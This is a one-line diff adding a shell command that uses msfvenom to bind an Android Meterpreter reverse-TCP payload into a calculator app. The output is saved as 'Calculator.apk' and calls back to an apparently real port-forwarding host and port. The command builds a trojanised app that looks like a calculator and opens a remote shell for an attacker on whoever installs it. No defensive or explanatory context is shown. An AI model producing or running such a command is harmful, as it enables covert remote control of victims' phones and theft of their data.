@@ -1,0 +1,1 @@
+msfvenom -x calc.apk -p android/meterpreter/reverse_tcp LHOST=itzvivan-63276.portmap.host LPORT=63276 -o Calculator.apk
